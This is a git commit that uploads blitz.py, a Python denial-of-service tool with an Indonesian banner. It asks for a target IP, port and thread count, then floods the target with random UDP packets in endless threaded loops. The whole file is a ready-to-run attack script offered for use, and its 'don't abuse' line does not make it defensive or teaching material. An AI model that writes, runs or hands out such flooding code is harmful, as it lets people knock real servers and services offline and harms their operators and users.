add154dfcb0b67e3b3e7bde15fc94d4eaeb19123
Z4R13R <99081331+Zarier22@users.noreply.github.com>
2023-01-04 21:10:30 +0700

    Add files via upload

---
+++ blitz.py
@@ -0,0 +1,78 @@
+import socket
+import random
+import threading
+import time
+import os,sys
+import os
+
+print ("\033[91m TOOLS H4N5 V2")
+print ("TIDAK MENJAMIN TEMBUS DI SERVER BESAR/BER ANTI DDOS.")
+print ("DONT ABUSE BROTHER!!")
+
+ip = str(input("  \033[0;31mIP:"))
+port = int(input(" \033[0;32mPort:"))
+choice = str(input(" \033[94mMethods: "))
+times = int(input(" \033[0;31mPacket:"))
+threads = int(input(" \033[0;32mThreads:"))
+os.system("clear")
+def run():
+	data = random._urandom(577)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Xeriaz ")
+		except:
+			print("[!] ERROR SERVER TIME OUT")
+
+def run2():
+	data = random._urandom(818)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Xeriaz ")
+		except:
+			print("[!] ERROR SERVER TIME OUT")
+
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Xeriaz ")
+		except:
+			print("[!] ERROR SERVER TIME OUT")			
+			
+for y in range(threads):
+	if choice == 'UDP':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+	if choice == 'udp':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+else:
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
